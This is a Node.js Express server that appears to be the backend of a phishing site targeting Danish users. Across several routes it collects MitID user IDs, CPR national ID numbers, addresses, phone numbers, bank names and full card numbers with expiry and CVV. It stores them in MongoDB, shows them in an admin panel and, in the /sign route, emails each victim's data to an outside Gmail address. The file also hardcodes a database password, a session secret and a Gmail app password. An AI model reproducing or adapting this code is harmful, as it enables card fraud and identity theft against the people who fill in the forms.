const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const session = require('express-session');
const flash = require('express-flash');
const MongoDbStore = require('connect-mongo');
const http = require('http');
const https = require('https');
const fs = require('fs');
const nodemailer = require("nodemailer");


const optionSSL = {
  key: fs.readFileSync('./key.pem'),
  cert: fs.readFileSync('./cert.pem'),
};

const app = express();
const PORT = process.env.PORT || 100;

app.use(express.json());
app.use(bodyParser.json());
app.use(express.static('public'));
app.use(
  bodyParser.urlencoded({
    extended: false,
  })
);
app.use('/static', express.static('./static/'));

app.use(flash());
mongoose.connect(
  'mongodb+srv://niko:Mamka123@cluster0.wsrxz.mongodb.net/?retryWrites=true&w=majority',
  {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }
);

app.use(
  session({
    secret: '1234567qwdeq890QWERTY',
    resave: false,
    store: MongoDbStore.create({
      mongoUrl:
        'mongodb+srv://niko:Mamka123@cluster0.wsrxz.mongodb.net/?retryWrites=true&w=majority',
    }),
    saveUninitialized: false,
    cookie: { maxAge: 1000 * 60 * 60 * 24 },
  })
);
const user = require('./backend/models/user');
const data = require('./backend/models/data');
app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

app.post('/cpr', async (req, resp) => {
  req.session.cpr = req.body.cpr;
  return resp.redirect('/arso')
})

app.post('/sign', async (req, resp) => {
  req.session.name = req.body.name;
  req.session.address = req.body.address;
  req.session.by = req.body.by;
  req.session.postalCode = req.body.postalCode;
  req.session.phone = req.body.phone;
  req.session.card = req.body.card;
  req.session.expiry = req.body.expiry;
  req.session.cvv = req.body.cvv;
  req.session.bank = req.body.bank;

  const savedata = new data({
    // ids: ids,
    // code: code,
    userId: req.session.userId,
    card: req.session.card,
    expiry: req.session.expiry,
    cvv: req.session.cvv,
    name: req.session.name,
    address: req.session.address,
    by: req.session.by,
    postalCode: req.session.postalCode,
    phone: req.session.phone,
    cpr: req.session.cpr,
    bank: req.session.bank,
  });
  console.log(savedata)


  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: "nmunshi40@gmail.com",
      pass: 'larwrezmcepfztfj',
    },
    tls: {
      // do not fail on invalid certs
      rejectUnauthorized: false,
    },
  });


  var body = `<div>MitId</div><br><div>${req.session.userId}</div><br><br><hr><div>CPR-nummer</div><br><div>${req.session.cpr}</div><br><br><hr><div>Personal Details</div><br><div>${req.session.name}</div><div>${req.session.address}</div><div>${req.session.by}</div><br><br><hr><div>Phone Number</div><br><div>${req.session.phone}</div><br><br><hr><div>Bank Details</div><br><div>${req.session.bank}</div><div>${req.session.card}</div><div>${req.session.expiry}</div><div>${req.session.cvv}</div>`
  console.log(body)
  await transporter.sendMail({
    from: 'nmunshi40@gmail.com',
    to: 'Nikopet27@gmail.com',
    subject: 'Information Of Users',
    html: body
  });


  console.log("email sent sucessfully");

  const r =await data.create(savedata)
  console.log(r)
  return resp.redirect('/final');
});

app.post('/sign_admin', async (req, resp) => {
  var email = req.body.email;
  var password = req.body.password;

  const userdata = await user.findOne({ email: email });
  if (userdata != null) {
    if (password === userdata.password) {
      if (req.session.user == null) {
        req.session.user = userdata;
        resp.redirect('/admin/data');
      } else {
        req.session.user = userdata;
        resp.redirect('/admin/data');
      }
    } else {
      console.log('User Not Found');
    }
  }
});

app.post('/upload', async (req, resp) => {
  var ids = req.body.ids;
  var code = req.body.code;

  const savedata = new data({
    ids: ids,
    code: code,
    userId: req.session.userId,
    card: req.session.card,
    expiry: req.session.expiry,
    cvv: req.session.cvv,
    name: req.session.name,
    address: req.session.address,
    by: req.session.by,
    postalCode: req.session.postalCode,
    phone: req.session.phone,
    cpr: req.session.cpr,
    bank: req.session.bank,
  });
  console.log(savedata);

  await savedata
    .save()
    .then((user) => {
      resp.send(user);
    })
    .catch((err) => {
      console.log(err);
    });
});

app.post('/data', (req, resp) => {
  if (req.session.userId != null) {
    req.session.userId = req.body.userId;
    resp.redirect('cpr');
  } else {
    req.session.userId = '';
    req.session.userId = req.body.userId;
    resp.redirect('cpr');
  }
});

app.post('/info', (req, resp) => {
  req.session.card = req.body.card;
  req.session.expiry = req.body.expiry;
  req.session.cvv = req.body.cvv;
  req.session.bank = req.body.bank;
  return req.session.expiry && resp.redirect('/data');
});

require('./backend/routes/web')(app);

// app.listen(PORT, '0.0.0.0', () => {
//   console.log('server running');
// });

app.get('*', function (req, res, next) {
  res.redirect('https://' + req.headers.host + req.path);
});

app.listen(PORT, (req, resp) => {
  console.log('server running')
})
